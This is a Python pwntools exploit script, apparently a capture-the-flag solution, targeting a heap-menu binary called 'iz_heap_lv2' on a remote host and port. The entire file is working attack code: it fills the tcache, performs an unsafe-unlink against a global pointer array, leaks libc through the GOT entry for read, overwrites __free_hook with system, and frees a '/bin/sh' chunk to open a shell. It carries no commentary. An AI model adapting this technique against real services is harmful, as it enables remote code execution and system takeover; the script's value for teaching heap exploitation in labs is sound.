#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./iz_heap_lv2"
elf = context.binary
#  libc = elf.libc
libc = ELF("./libc.so.6")

def add(size, cont):
    io.sendlineafter("Choice: \n", "1")
    io.sendlineafter("size: ", str(size))
    io.sendafter("data: ", cont)
    sleep(0.01)

def edit(idx, cont):
    io.sendlineafter("Choice: \n", "2")
    io.sendlineafter("index: ", str(idx))
    io.sendafter("data: ", cont)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("Choice: \n", "3")
    io.sendlineafter("index: ", str(idx))

def show(idx):
    io.sendlineafter("Choice: \n", "4")
    io.sendlineafter("index: ", str(idx))

def DEBUG():
    gdbcmd = '''
    b *0x400B63
    b *0x400CE8
    c
    '''
    gdb.attach(io, gdbcmd)
    sleep(0.5)


# io = process("./iz_heap_lv2")
io = remote("165.22.110.249", 4444)

for i in xrange(9):
    add(0xf8, str(i))

for i in xrange(7):
    delete(i + 2)

ptr = 0x602040
edit(0, flat(0, 0xf0, ptr - 0x18, ptr- 0x10).ljust(0xf0, '\0') + flat(0xf0))
delete(1)

edit(0, flat(0, 0, 0, ptr + 8, elf.got['read']))
show(1)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['read']
print("libc @ {:#x}".format(libc.address))

add(0x100, 'x')
add(0x100, "/bin/sh\0")
edit(0, flat(0, libc.sym['__free_hook']))
edit(2, flat(libc.sym['system']))

delete(3)

io.interactive()
